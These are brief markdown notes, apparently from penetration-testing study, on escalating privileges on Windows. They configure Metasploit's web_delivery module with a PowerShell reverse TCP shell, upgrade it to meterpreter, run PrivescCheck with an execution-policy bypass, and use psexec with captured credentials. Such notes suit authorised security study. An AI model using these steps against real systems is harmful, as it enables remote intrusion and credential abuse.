# Identifying Windows Privilege escalation
This script identifies privilige escalation  
https://github.com/itm4n/PrivescCheck

**Web Delivery**  
- Module: multi/script/web_delivery
  - This creates a script that we can run on the target system
  - Set target to powershell (for windows) -- ```set target PSH\ (Binary)```
  - set payload windows/shell/reverse_tcp
  - set PSH-EncodedCommand false

Use shell to meterpreter  
1. set LHOST
2. set SESSION
3. Show advanced
4. set WIN_TRANSFER VBS

Migrate to explorer.exe  
Run the script using command from the github page -- ```powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"```

# Escalating Windows Privileges
take the credentials received and run psexec  
1. ```psexec.py Username@(IP)```  
2. type password
3. type whoami and it will tell you your privs
